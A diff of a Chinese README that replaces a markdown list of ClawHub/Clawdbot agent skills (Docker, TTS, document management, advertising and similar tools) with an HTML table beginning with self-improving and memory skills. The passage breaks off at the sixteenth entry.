-| Discord 诊断工具 | [Clawdbot/discord-doctor](https://clawdhub.com/skills/discord-doctor) | 快速诊断和修复 Discord 机器人、网关、OAuth 令牌和旧配置问题。检查连接、令牌过期并清理旧的 Clawdis 工件。 |
-| Docker Compose 生成器 | [Clawdbot/docker-compose-gen](https://clawdhub.com/skills/docker-compose-gen) | 通过扫描您的项目生成 docker-compose.yml。在容器化现有应用程序时使用。 |
-| Docker 诊断 | [Clawdbot/docker-diag](https://clawdhub.com/skills/docker-diag) | 使用信号提取对 Docker 容器进行高级日志分析。 |
-| Dockerfile 生成器 | [Clawdbot/docker-writer](https://clawdhub.com/skills/docker-writer) | 扫描您的项目并生成优化的 Dockerfile。当您需要快速容器化时使用。 |
-| JSDoc/TSDoc 文档生成器 | [Clawdbot/docs-gen](https://clawdhub.com/skills/docs-gen) | 将 JSDoc 或 TSDoc 注释添加到您的代码中。当文档丢失时使用。 |
-| 领域工具包 | [Clawdbot/domain](https://clawdhub.com/skills/domain) | 域智能工具包 - 按关键字搜索新注册的域 (NRDS)，并按名称服务器反向查找域 (NS Reverse)。适用于域名投资者、品牌保护和研究。 |
-| 双字API | [Clawdbot/doubleword](https://clawdhub.com/skills/doubleword) | （无） |
-| 双字API | [Clawdbot/doubleword-api](https://clawdhub.com/skills/doubleword-api) | （无） |
-| 边缘 tts | [Clawdbot/edge-tts](https://clawdhub.com/skills/edge-tts) | 使用 node-edge-tts npm 包进行文本到语音转换，从文本生成音频。 支持多种语音、语言、速度调节、音调控制、字幕生成。 在以下情况下使用： (1) 用户使用“tts”触发器或关键字请求音频/语音输出。 (2) 内容需要说出来而不是阅读（多任务处理、无障碍、驾驶、烹饪）。 (3) 用户想要特定的语音、速度、音调或格式进行 TTS 输出。 |
-| 埃克萨 | [Clawdbot/exa](https://clawdhub.com/skills/exa) | 通过 Exa AI API 进行神经网络搜索和代码上下文。需要 EXA_API_KEY。用于查找文档、代码示例、研究论文或公司信息。 |
-| exa-web-search-free | [Clawdbot/exa-web-search-free](https://clawdhub.com/skills/exa-web-search-free) | 通过Exa MCP进行免费的人工智能搜索。网络搜索新闻/信息，从GitHub/StackOverflow搜索文档/示例的代码，公司的商业情报研究。无需API密钥。 |
-| Excel 表格批处理 | [Clawdbot/excel](https://clawdhub.com/skills/excel) | 读取、写入、编辑 Excel 文件 (.xlsx) 并设置其格式。创建电子表格、操作数据、应用格式、管理工作表、合并单元格、查找/替换以及导出到 CSV/JSON/Markdown。用于任何 Excel 文件操作任务。 |
-| 钉钉 AI 表格（多维表） | [Clawdbot/dingtalk-ai-table](https://clawdhub.com/skills/dingtalk-ai-table) | 钉钉多维表 AI 操作技能，通过 mcporter CLI 连接钉钉 MCP server 执行表结构管理、字段操作及记录增删改查，适合构建库存、项目等表格自动化流程。 |
-| Figma 设计分析助手 | [Clawdbot/figma](https://clawdhub.com/skills/figma) | 专业Figma设计分析和资产导出。用于提取设计数据、以多种格式导出资产、审核可访问性合规性、分析设计系统以及生成全面的设计文档。具有强大的导出和报告功能对 Figma 文件进行只读分析。 |
-| Firecrawl 网页抓取 | [Clawdbot/firecrawler](https://clawdhub.com/skills/firecrawler) | 使用 Firecrawl API 进行网页抓取和爬行。以降价形式获取网页内容、截取屏幕截图、提取结构化数据、搜索网络以及抓取文档站点。当用户需要抓取 URL、获取当前 Web 信息、捕获屏幕截图、从页面提取特定数据或抓取框架/库的文档时使用。 |
-| fliz-ai-视频生成器 | [Clawdbot/fliz-ai-video-generator](https://clawdhub.com/skills/fliz-ai-video-generator) | Fliz REST API 的完整集成指南 - 一个人工智能驱动的视频生成平台，可将文本内容转换为带有画外音、人工智能生成的图像和字幕的专业视频。  在以下情况下使用此技能： - 创建与 Fliz API 的集成（WordPress、Zapier、Make、n8n、自定义应用程序） - 通过 API 构建视频生成工作流程 - 实施用于视频完成通知的 webhook 处理程序 - 开发创建、管理或翻译视频的自动化工具 - 解决 Fliz API 错误或身份验证问题 - 了解视频处理步骤和状态轮询  主要功能：从文本/摘要创建视频、视频状态监控、翻译、复制、语音/音乐列表、webhook 通知。 |
-| 前端设计系统提取器 | [Clawdbot/frontend-design-extractor](https://clawdhub.com/skills/frontend-design-extractor) | 从前端代码库中提取可重用的 UI/UX 设计系统：设计令牌、全局样式、组件、交互模式和页面模板。在分析任何前端存储库（React/Vue/Angular/Next/Vite/等）时使用，以记录或迁移 UI/UX 以在项目之间重用。仅关注 UI/UX；明确忽略业务逻辑和域工作流程。 |
-| 伽玛 | [Clawdbot/gamma](https://clawdhub.com/skills/gamma) | 使用 Gamma.app API 生成人工智能驱动的演示文稿、文档和社交帖子。当用户要求创建演示文稿、宣传资料、幻灯片、文档或社交媒体轮播时使用。触发诸如“创建有关 X 的演示文稿”、“制作宣传材料”、“生成幻灯片”或“创建有关 X 的 Gamma”等请求。 |
-| GIF 搜索工具 | [Clawdbot/gifgrep](https://clawdhub.com/skills/gifgrep) | 使用 CLI/TUI 搜索 GIF 提供商、下载结果并提取静态图片/表格。 |
-| Google 广告管理 | [Clawdbot/google-ads](https://clawdhub.com/skills/google-ads) | 查询、审核和优化 Google Ads 广告系列。支持两种模式：(1) 使用 google-ads Python SDK 进行批量操作的 API 模式，(2) 没有 API 访问权限的用户的浏览器自动化模式 - 只需将浏览器标签附加到 ads.google.com。当要求检查广告效果、暂停广告系列/关键字、查找浪费的支出、审核转化跟踪或优化 Google Ads 帐户时使用。 |
-| Guru 知识库助手 | [Clawdbot/guru-mcp](https://clawdhub.com/skills/guru-mcp) | 通过 MCP 访问 Guru 知识库 - 询问 AI 问题、搜索文档、创建草稿和更新卡片。连接到您的所有 Guru 源，包括 Slack、Drive、Confluence 和 SharePoint。 |
-| AI 文本去重工具 | [Clawdbot/humanizer](https://clawdhub.com/skills/humanizer) | 从文本中删除人工智能生成的文字痕迹。编辑或审阅时使用 文本，使其听起来更自然、更人性化。基于维基百科的 全面的“人工智能写作的标志”指南。检测并修复模式，包括： 夸大的象征意义、宣传语言、肤浅的分析、含糊不清 归因、em dash 过度使用、三法则、AI 词汇、负面 排比和过多的连词。 |
-| 事件/PCN 证据包生成（英国） | [Clawdbot/incident-pcn-evidence-appeal-corrective-actions-uk](https://clawdhub.com/skills/incident-pcn-evidence-appeal-corrective-actions-uk) | 构建事件/PCN 证据包，包括时间表、上诉草案、纠正措施和后续监控。在处理 PCN 或需要文档的事件时使用。 |
-| 文档转 Markdown | [Clawdbot/intomd](https://clawdhub.com/skills/intomd) | 使用 into.md 服务获取任何文档 URL 并将其转换为 Markdown。 |
-| PDF 发票生成器 | [Clawdbot/invoice-generator](https://clawdhub.com/skills/invoice-generator) | 从 JSON 数据生成专业的 PDF 发票。当用户需要创建包含公司/客户详细信息和行项目的发票、开票凭证或付款请求时使用。 |
-| 日语学习助手 | [Clawdbot/japanese-tutor](https://clawdhub.com/skills/japanese-tutor) | 互动日语学习助手。支持词汇、语法、测验、角色扮演、用于学习/作业帮助的 PDF/DOCX 材料解析以及 OCR 翻译。 |
-| Jina Reader | [Clawdbot/jina-reader](https://clawdhub.com/skills/jina-reader) | 通过 Jina AI Reader API 提取网页内容。三种模式：阅读（URL 转 Markdown）、搜索（网络搜索+完整内容）、地面（事实检查）。提取干净的内容而不暴露服务器 IP。 |
-| JSDoc 注释生成器 | [Clawdbot/jsdoc-gen](https://clawdhub.com/skills/jsdoc-gen) | 将 JSDoc 或 TSDoc 注释添加到您的代码中。当文档丢失时使用。 |
-| K8s 配置生成器 | [Clawdbot/k8s-config-gen](https://clawdhub.com/skills/k8s-config-gen) | 从 docker-compose 或描述生成 Kubernetes 清单。部署到 K8s 时使用。 |
-| K8s 清单生成器 | [Clawdbot/k8s-gen](https://clawdhub.com/skills/k8s-gen) | 从 docker-compose 或简单英语生成 Kubernetes 清单。将应用程序部署到 K8s 时使用。 |
-| Komodo | [Clawdbot/komodo](https://clawdhub.com/skills/komodo) | 管理 Komodo 基础设施 - 服务器、Docker 部署、堆栈、构建和过程。当用户询问服务器状态、容器管理、部署、构建或任何与 Komodo 相关的基础设施任务时使用。 |
-| Linear 问题跟踪 | [Clawdbot/linearis](https://clawdhub.com/skills/linearis) | 用于问题跟踪的 Linear.app CLI。用于列出、创建、更新和搜索线性问题、评论、文档、周期和项目。针对具有 JSON 输出的 LLM 代理进行了优化。 |
-| LLMWhisperer 文档解析 | [Clawdbot/llmwhisperer](https://clawdhub.com/skills/llmwhisperer) | 使用 LLMWhisperer API 从图像和 PDF 中提取文本和布局。适合手写和复杂的形式。 |
-| 页面加载优化工具 | [Clawdbot/loadpage](https://clawdhub.com/skills/loadpage) | 从文本中删除人工智能生成的文字痕迹。编辑或审阅时使用 文本，使其听起来更自然、更人性化。基于维基百科的 全面的“人工智能写作的标志”指南。检测并修复模式，包括： 夸大的象征意义、宣传语言、肤浅的分析、含糊不清 归因、em dash 过度使用、三法则、AI 词汇、负面 排比和过多的连词。 |
-| 文档格式转换器 | [Clawdbot/markdown-converter](https://clawdhub.com/skills/markdown-converter) | 使用 markitdown 将文档和文件转换为 Markdown。将 PDF、Word (.docx)、PowerPoint (.pptx)、Excel（.xlsx、.xls）、HTML、CSV、JSON、XML、图像（带 EXIF/OCR）、音频（带转录）、ZIP 存档、YouTube URL 或 EPub 转换为 Markdown 格式以进行 LLM 处理或文本分析时使用。 |
-| Microsoft 广告管理 | [Clawdbot/microsoft-ads-mcp](https://clawdhub.com/skills/microsoft-ads-mcp) | 通过 MCP 服务器创建和管理 Microsoft Advertising 广告活动（Bing Ads / DuckDuckGo Ads） - 广告活动、广告组、关键字、广告和报告 |
-| MoltDocker | [Clawdbot/moltbot-docker](https://clawdhub.com/skills/moltbot-docker) | 使机器人能够管理 Docker 容器、映像和堆栈。 |
-| MSPOT 战略文档生成器 | [Clawdbot/mspot-generator](https://clawdhub.com/skills/mspot-generator) | 创建一页战略调整文档。使命、战略、项目、遗漏、跟踪。强制明确你会做什么和不会做什么。当用户说“mspot”、“战略计划”、“季度计划”、“我们不做什么”、“遗漏”、“团队协调”、“OKR 替代方案”、“优先事项”、“我们应该关注什么”时使用。 |
-| Nano PDF 编辑器 | [Clawdbot/nano-pdf](https://clawdhub.com/skills/nano-pdf) | 使用 nano-pdf CLI 使用自然语言指令编辑 PDF。 |
-| NanoBanana PPT 工具 | [Clawdbot/nanobanana-ppt-skills](https://clawdhub.com/skills/nanobanana-ppt-skills) | （无） |
-| NocoDB 数据库管理 | [Clawdbot/nocodb](https://clawdhub.com/skills/nocodb) | 通过 REST API 访问和管理 NocoDB 数据库、表和记录。当用户想要查看库、列出表、检查列模式、查询或筛选行数据或将新记录插入自托管 NocoDB 实例时使用。还用于电子表格样式的数据库查找和数据输入。 |
-| Nudocs 文档协作 | [Clawdbot/nudocs](https://clawdhub.com/skills/nudocs) | 通过 Nudocs.ai 上传、编辑和导出文档。在创建可共享文档链接以进行协作编辑、将 Markdown/文档上传到 Nudocs 进行丰富编辑或拉回已编辑的内容时使用。触发“发送到 nudocs”、“上传到 nudocs”、“在 nudocs 中编辑”、“从 nudocs 拉取”、“获取 nudocs 链接”、“显示我的 nudocs 文档”。 |
-| Obsidian 笔记管理 | [Clawdbot/obsidian](https://clawdhub.com/skills/obsidian) | 使用 ObsidianVaults（纯 Markdown 注释）并通过 obsidian-cli 实现自动化。 |
-| Octolens 品牌提及分析 | [Clawdbot/octolens](https://clawdhub.com/skills/octolens) | 从 Octolens API 查询和分析品牌提及。当用户想要获取提及、跟踪关键字、按源平台（Twitter、Reddit、GitHub、LinkedIn 等）过滤、情绪分析或分析社交媒体参与度时使用。支持使用 AND/OR 逻辑、日期范围、关注者计数和书签进行复杂的过滤。 |
-| 新员工入职文档生成器 | [Clawdbot/onboard-gen](https://clawdhub.com/skills/onboard-gen) | 为新开发人员生成入职文档。在设置新团队成员时使用。 |
-| 入职文档生成器 | [Clawdbot/onboarding-gen](https://clawdhub.com/skills/onboarding-gen) | 为新开发人员生成入职文档。在改善开发体验时使用。 |
-| OpenAI 开发文档查询 | [Clawdbot/openai-docs](https://clawdhub.com/skills/openai-docs) | 使用 CLI (curl/jq) 通过 OpenAI Docs MCP 服务器查询 OpenAI 开发人员文档。当任务涉及 OpenAI API（响应、聊天完成、实时等）、OpenAI SDK、ChatGPT Apps SDK、Codex、MCP 集成、端点架构、参数、限制或迁移并且您需要最新的官方指导时，请使用。 |
-| OpenAI 文本转语音 | [Clawdbot/openai-tts-python](https://clawdhub.com/skills/openai-tts-python) | 使用 OpenAI 的 TTS API 进行文本到语音转换，生成高质量、自然的音频。 支持6种声音（合金、回声、寓言、onyx、nova、shimmer），速度控制（0.25x-4.0x）， 高清质量模型、多种输出格式（mp3、opus、aac、flac）和自动文本分块 对于长内容（每个请求 4096 个字符限制）。 在以下情况下使用：(1) 用户通过“读给我听”等触发器请求音频/语音输出， “转换为音频”、“生成语音”、“文本到语音”、“tts”、“叙述”、“说话”、 或者当关键字“openai tts”、“voice”、“podcast”出现时。 (2)需要说出的内容 而不是阅读（多任务处理、可访问性）。 (3) 用户想要特定的语音偏好 例如“合金”、“回声”、“寓言”、“缟玛瑙”、“新星”、“微光”或速度调整。 |
-| OpenSSL 安全工具 | [Clawdbot/openssl](https://clawdhub.com/skills/openssl) | 使用 OpenSSL 生成安全的随机字符串、密码和加密令牌。在创建密码、API 密钥、机密或任何安全随机数据时使用。 |
-| Paperless-NGX 文档管理 | [Clawdbot/paperless](https://clawdhub.com/skills/paperless) | 通过 ppls CLI 与 Paperless-NGX 文档管理系统交互。搜索、检索、上传和组织文档。 |
-| Paperless-NGX 文档管理 | [Clawdbot/paperless-docs](https://clawdhub.com/skills/paperless-docs) | 在 Paperless-ngx 中管理文档 - 搜索、上传、标记和检索。 |
-| Paperless-NGX 文档管理 | [Clawdbot/paperless-ngx](https://clawdhub.com/skills/paperless-ngx) | 通过 REST API 与 Paperless-ngx 文档管理系统交互。当用户想要在 Paperless-ngx 实例中搜索、上传、下载、组织文档、管理标签、通讯员或文档类型时使用。 |
-| Paperless-NGX 文档管理工具 | [Clawdbot/paperless-ngx-tools](https://clawdhub.com/skills/paperless-ngx-tools) | 在 Paperless-ngx 中管理文档 - 搜索、上传、标记和检索。 |
-| Perry Workspaces | [Clawdbot/perry-workspaces](https://clawdhub.com/skills/perry-workspaces) | 使用预安装的 Claude Code 和 OpenCode 在尾网上创建和管理隔离的 Docker 工作区。在使用 Perry 工作区、连接到编码代理或管理远程开发环境时使用。 |
-| WordPress 内容自动化 | [Clawdbot/pinch-to-post](https://clawdhub.com/skills/pinch-to-post) | Clawdbot 的 WordPress 自动化。通过 REST API 或 WP-CLI 管理帖子、页面、WooCommerce 产品、订单、库存、评论、SEO (Yoast/RankMath)、媒体。多站点支持、批量操作、内容健康检查、降价到古腾堡、社交交叉发布。 50 多项功能——只需询问即可。 |
-| 创业宣传材料生成器 | [Clawdbot/pitch-gen](https://clawdhub.com/skills/pitch-gen) | 使用人工智能生成初创公司宣传材料内容。在构建投资者平台或初创公司演示时使用。 |
-| Portainer | [Clawdbot/portainer](https://clawdhub.com/skills/portainer) | 通过 Portainer API 控制 Docker 容器和堆栈。列出容器、启动/停止/重新启动、查看日志以及从 git 重新部署堆栈。 |
-| PowerPoint 演示文稿生成器 | [Clawdbot/pptx-creator](https://clawdhub.com/skills/pptx-creator) | 根据大纲、数据源或 AI 生成的内容创建专业的 PowerPoint 演示文稿。支持自定义模板、样式预设、数据图表/表格以及人工智能生成的图像。当要求创建幻灯片、宣传材料、报告或演示文稿时使用。 |
-| 产品需求文档生成器 | [Clawdbot/prd](https://clawdhub.com/skills/prd) | 创建和管理产品需求文档 (PRD)。在以下情况下使用：(1) 使用用户故事创建结构化任务列表，(2) 指定具有验收标准的功能，(3) 为 AI 代理或人类开发人员规划功能实施。 |
-| Markdown 预览 | [Clawdbot/preview-markdown](https://clawdhub.com/skills/preview-markdown) | 使用 GitHub 风格的格式和语法突出显示在浏览器中渲染和预览 Markdown 文件 |
-| Prezentit 演示文稿生成 | [Clawdbot/prezentit](https://clawdhub.com/skills/prezentit) | 立即生成精美的人工智能演示文稿。创建具有自定义主题、视觉设计和演讲者注释的专业幻灯片 - 全部通过自然语言命令。连接您的 Prezentit 帐户以直接通过聊天生成演示文稿。 |
-| GitHub 仓库阅读 | [Clawdbot/read-github](https://clawdhub.com/skills/read-github) | 以正确的方式阅读 GitHub 存储库 - 通过 gitmcp.io 而不是原始抓取。为什么这优于网络搜索：(1) 跨文档语义搜索，而不仅仅是关键字匹配，(2) 具有准确文件结构的智能代码导航 - 存储库布局零幻觉，(3) 针对 LLM 优化的适当降价输出，而不是原始 HTML/JSON 垃圾，(4) 在一个干净的界面中聚合 README + /docs + 代码，(5) 尊重速率限制和 robots.txt。停止粘贴原始 GitHub URL - 使用此替代。 |
-| README 生成器 | [Clawdbot/readme-gen](https://clawdhub.com/skills/readme-gen) | 生成带有徽章、安装说明和 API 文档的精美 README.md 文件。开始新项目时使用。 |
-| README 编写器 | [Clawdbot/readme-writer](https://clawdhub.com/skills/readme-writer) | 从您的代码库生成完善的 README.md 文件。当您快速需要文档时使用。 |
-| reMarkable 电子墨水设备 | [Clawdbot/remarkable](https://clawdhub.com/skills/remarkable) | 通过 reMarkable Cloud 将文件和网络文章发送到 reMarkable 电子墨水平板电脑。上传 PDF、EPUB，或将网络文章转换为可读电子书并将其发送到设备。还可以浏览和管理设备上的文件。当用户提及 reMarkable、想要将文章或文档发送到其电子阅读器或管理 reMarkable 云文件时使用。 |
-| 公司研究报告生成 | [Clawdbot/research-company](https://clawdhub.com/skills/research-company) | B2B 公司研究制作专业的 PDF 报告。当被要求研究公司、分析业务、创建帐户资料或从公司 URL 生成市场情报时使用。输出格式精美、可下载的 PDF 报告。 |
-| SEO 关键词研究 | [Clawdbot/seo-dataforseo](https://clawdhub.com/skills/seo-dataforseo) | 使用 DataForSEO API 进行 SEO 关键词研究。执行关键字分析、YouTube 关键字研究、竞争对手分析、SERP 分析和趋势跟踪。当用户要求执行以下操作时使用：研究关键字、分析搜索量/每次点击费用/竞争、查找关键字建议、检查关键字难度、分析竞争对手、获取热门话题、进行 YouTube SEO 研究或优化着陆页关键字。需要 DataForSEO API 帐户和 .env 文件中的凭据。 |
-| ServiceNow 文档搜索 | [Clawdbot/servicenow-docs](https://clawdhub.com/skills/servicenow-docs) | 搜索和检索 ServiceNow 文档、发行说明和开发人员文档（API、参考、指南）。通过 Zoomin 和developer.servicenow.com API 使用 docs.servicenow.com 来获取开发人员主题。 |
-| SilverBullet API | [Clawdbot/silverbullet-skill](https://clawdhub.com/skills/silverbullet-skill) | SilverBullet 笔记应用程序的 MCP 服务器 - 读取、写入、搜索和管理 Markdown 页面 |
-| SOLO.ro 会计平台 | [Clawdbot/solo-cli](https://clawdhub.com/skills/solo-cli) | 通过 CLI 或 TUI（摘要、收入、费用、队列、e-factura、公司）监控 SOLO.ro 会计平台并与之交互。当用户要求检查其会计数据、查看发票、费用或 e-factura 文档或将任务转换为安全的 alone-cli 命令时使用。 |
-| Sponge 加密钱包 | [Clawdbot/sponge-wallet](https://clawdhub.com/skills/sponge-wallet) | 通过 x402 小额支付管理加密钱包、转移代币、在 DEX 上交换、检查余额以及访问付费 API（搜索、图像生成、预测市场、网络抓取、文档解析、销售勘探）。当用户询问钱包余额、代币转移、交换、区块链支付或付费 API 服务时使用。 |
-| Storybook 故事生成器 | [Clawdbot/storybook-gen](https://clawdhub.com/skills/storybook-gen) | 从 React 组件生成 Storybook 故事。在记录组件或设置设计系统时使用。 |
-| 网站风格指南生成器 | [Clawdbot/style-guide-generator](https://clawdhub.com/skills/style-guide-generator) | 从 URL、屏幕截图和现有文档生成全面的网站风格指南和设计系统。当用户要求从网站、应用程序或现有材料创建风格指南、设计系统文档、品牌指南文档或设计规范时，请使用此技能。该技能可以按照行业标准的样式指南结构生成专业的 PDF 输出。 |
-| 内容摘要工具 | [Clawdbot/summarize](https://clawdhub.com/skills/summarize) | 使用汇总 CLI 汇总 URL 或文件（Web、PDF、图像、音频、YouTube）。 |
-| Supernote 电子墨水设备 | [Clawdbot/supernote-cloud](https://clawdhub.com/skills/supernote-cloud) | 访问自托管的 Supernote 私有云实例，可以浏览文件和文件夹、上传文档（PDF、EPUB）和笔记、将网页文章转换为 EPUB/PDF 并发送到设备、检查存储容量以及导航目录树。当用户提及 Supernote、电子墨水设备文件、想要在其 Supernote 云上上传/浏览文档或想要将文章/URL 发送到其电子阅读器时使用。 |
-| Swagger/OpenAPI 规范生成器 | [Clawdbot/swagger-gen](https://clawdhub.com/skills/swagger-gen) | 从 Express 路由生成 OpenAPI 规范。在记录 API 时使用。 |
-| Tasker 任务管理 | [Clawdbot/task](https://clawdhub.com/skills/task) | Tasker 文档存储通过工具调度进行任务管理。用于任务列表、今天到期/逾期、周计划、添加/移动/完成或显式/任务命令。 |
-| Telegram 富文本消息 | [Clawdbot/telegram-compose](https://clawdhub.com/skills/telegram-compose) | 通过直接 Telegram API 使用 HTML 格式撰写丰富、可读的 Telegram 消息。 在以下情况下使用：(1) 发送超出简单一行回复的任何 Telegram 消息， (2) 创建包含部分、列表或状态更新的结构化消息， (3) 需要通过 Clawdbot 的 Markdown 转换无法进行格式设置（下划线、剧透、可扩展块引用、用户通过 ID 提及）， (4) 向 Telegram 发送警报、报告、摘要或通知， (5) 需要具有视觉层次结构的专业、可扫描的消息格式。 默认使用此技能进行实质性 Telegram 通信。 |
-| 时间跟踪工具 | [Clawdbot/timesheet](https://clawdhub.com/skills/timesheet) | 使用 timesheet.io CLI 跟踪时间、管理项目和任务 |
-| 会议记录转学习材料 | [Clawdbot/transcript-to-content](https://clawdhub.com/skills/transcript-to-content) | 此技能将培训和入职会议记录转化为结构化学习材料、文档和可操作的审核内容。在处理入职会议、培训会议或知识转移对话的会议记录时，可以使用此技能来提取关键信息并生成学习指南、快速参考表、清单、常见问题解答文档、行动项目列表和培训效果评估。 |
-| 运输调查工具包（ACAS 对齐） | [Clawdbot/transport-investigation-acas-aligned-pack](https://clawdhub.com/skills/transport-investigation-acas-aligned-pack) | 生成符合 ACAS 的调查邀请措辞、中性问题集和证据日志。在开始驾驶员事故调查/访谈时使用。 |
-| Twitter 搜索分析 | [Clawdbot/twitter-search-skill](https://clawdhub.com/skills/twitter-search-skill) | 高级 Twitter 搜索和社交媒体数据分析。使用 Twitter API 按关键字获取推文，处理多达 1000 个结果，并生成包含见解和可行建议的专业数据分析报告。当用户请求 Twitter/X 社交媒体搜索、社交媒体趋势分析、推文数据挖掘、社交聆听、影响者识别、推文主题情绪分析或任何涉及收集和分析 Twitter 数据以获得见解的任务时使用。 |
-| 社交媒体内容上传 | [Clawdbot/upload-post](https://clawdhub.com/skills/upload-post) | 通过 Upload-Post API 将内容上传到社交媒体平台。在将视频、照片、文本或文档发布到 TikTok、Instagram、YouTube、LinkedIn、Facebook、X (Twitter)、Threads、Pinterest、Reddit 或 Bluesky 时使用。支持调度、分析、FFmpeg 处理和上传历史记录。 |
-| Vercel 部署平台 | [Clawdbot/vercel](https://clawdhub.com/skills/vercel) | 使用完整的 CLI 参考来部署应用程序并管理项目。用于部署、项目、域、环境变量和实时文档访问的命令。 |
-| 语音转录工具 | [Clawdbot/voice-transcribe](https://clawdhub.com/skills/voice-transcribe) | 使用 OpenAI 的 gpt-4o-mini-transcribe 模型转录音频文件，并提供词汇提示和文本替换。需要 uv (https://docs.astral.sh/uv/)。 |
-| Voicenotes | [Clawdbot/voicenotes](https://clawdhub.com/skills/voicenotes) | 从 Voicenotes.com 同步和访问语音笔记。当用户想要从 Voicenotes 检索录音、文字记录和 AI 摘要时使用。支持获取笔记、同步到 Markdown 以及搜索成绩单。 |
-| Web 应用 QA 自动化 | [Clawdbot/web-qa-bot](https://clawdhub.com/skills/web-qa-bot) | 使用基于可访问性树的测试的 AI 支持的 Web 应用程序 QA 自动化。冒烟测试、测试套件和 PDF 报告。 |
-| 项目 Wiki 生成器 | [Clawdbot/wiki-gen](https://clawdhub.com/skills/wiki-gen) | 从您的代码库生成项目 wiki。创建文档时使用。 |
-| xkcd 漫画 | [Clawdbot/xkcd](https://clawdhub.com/skills/xkcd) | 获取 xkcd 漫画 - 最新、随机、按编号或按关键字搜索。显示带有标题、图像和替代文本（隐藏的笑话）的漫画。使用图像生成生成自定义 xkcd 风格的简笔画漫画。非常适合通过 cron 进行日常漫画交付、点播请求或创建受 xkcd 启发的原创内容。 |
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>自我改进代理</td>
+<td>Self-Improving Agent</td>
+<td><a href="https://clawdhub.com/skills/self-improving-agent">ClawHub/self-improving-agent</a></td>
+<td>捕获经验教训、错误和纠正，以实现持续改进。使用时机：（1）命令或操作意外失败；（2）用户纠正……</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>自我改进与主动代理</td>
+<td>Self-Improving + Proactive Agent</td>
+<td><a href="https://clawdhub.com/skills/self-improving">ClawHub/self-improving</a></td>
+<td>自我反思+自我批评+自我学习+自组织记忆。智能体评估自身工作、发现错误并持续改进。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>本体知识图谱</td>
+<td>ontology</td>
+<td><a href="https://clawdhub.com/skills/ontology">ClawHub/ontology</a></td>
+<td>类型化知识图谱，用于结构化智能体记忆与可组合技能。支持创建/查询实体（人员、项目、任务、事件、文档）及关联...</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>主动代理</td>
+<td>Proactive Agent</td>
+<td><a href="https://clawdhub.com/skills/proactive-agent">ClawHub/proactive-agent</a></td>
+<td>将AI智能体从任务执行者升级为主动预判需求、持续优化的智能伙伴。集成WAL协议、工作缓冲区、自主定时任务及实战验证模式。Hal Stack核心组件 🦞</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>Nano Banana Pro 图像生成</td>
+<td>Nano Banana Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/nano-banana-pro">ClawHub/nano-banana-pro</a></td>
+<td>使用 Nano Banana Pro (Gemini 3 Pro Image) 生成或编辑图像。支持文生图、图生图及 1K/2K/4K 分辨率，适用于图像创建、修改及编辑请求，使用 --input-image 指定输入图像。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>Whisper 语音转写</td>
+<td>Openai Whisper</td>
+<td><a href="https://clawdhub.com/skills/openai-whisper">ClawHub/openai-whisper</a></td>
+<td>使用 Whisper CLI 进行本地语音转文字（无需 API 密钥）</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>代理记忆</td>
+<td>Agent Memory</td>
+<td><a href="https://clawdhub.com/skills/agent-memory">ClawHub/agent-memory</a></td>
+<td>为AI智能体提供持久记忆，用于跨会话存储事实、从行动中学习、回忆信息及追踪实体。</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>免费 AI 模型路由</td>
+<td>Free Ride - Unlimited free AI 🔑</td>
+<td><a href="https://clawdhub.com/skills/free-ride">ClawHub/free-ride</a></td>
+<td>管理OpenClaw的OpenRouter免费AI模型，自动按质量排名模型，配置速率限制备用方案，并更新opencla...</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>能力进化引擎</td>
+<td>Evolver</td>
+<td><a href="https://clawdhub.com/skills/evolver">ClawHub/evolver</a></td>
+<td>AI智能体自我进化引擎。分析运行时历史识别改进点，应用协议约束进化。与EvoMap通信...</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>飞书进化器封装</td>
+<td>Feishu Evolver Wrapper</td>
+<td><a href="https://clawdhub.com/skills/feishu-evolver-wrapper">ClawHub/feishu-evolver-wrapper</a></td>
+<td>飞书集成的包装器，用于能力演进器。管理演进循环的生命周期（启动/停止/确保），发送丰富的飞书卡片报告，并提供...</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>Gemini CLI</td>
+<td>Gemini</td>
+<td><a href="https://clawdhub.com/skills/gemini">ClawHub/gemini</a></td>
+<td>Gemini CLI：一键问答、摘要与生成</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>Tavily 搜索</td>
+<td>Tavily Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/liang-tavily-search">ClawHub/liang-tavily-search</a></td>
+<td>使用Tavily的LLM优化API进行网络搜索，返回包含内容片段、评分和元数据的相关结果。</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>能力进化引擎</td>
+<td>Evolver</td>
+<td><a href="https://clawdhub.com/skills/capability-evolver">ClawHub/capability-evolver</a></td>
+<td>AI智能体自我进化引擎。分析运行时历史识别改进点，应用协议约束进化。与EvoMap通信...</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>记忆搜索配置</td>
+<td>Memory Setup 🔑</td>
+<td><a href="https://clawdhub.com/skills/memory-setup">ClawHub/memory-setup</a></td>
+<td>启用并配置 Moltbot/Clawdbot 记忆搜索以实现持久上下文。适用于初始化记忆、解决“金鱼脑”问题或协助用户配置 memorySearch。涵盖 MEMORY.md、日志记录及向量搜索设置。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>自我改进代理</td>
+<td>Self Improving Agent</td>
+<td><a href="https://clawdhub.com/skills/xiucheng-self-improving-agent">ClawHub/xiucheng-self-improving-agent</a></td>
+<td>自我改进的智能体系统，分析对话质量、识别改进机会、持续优化回复策略。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>ByteRover 知识库</td>
+<td>ByteRover</td>
+<td><a href="https://clawdhub.com/skills/byterover">ClawHub/byterover</a></td>
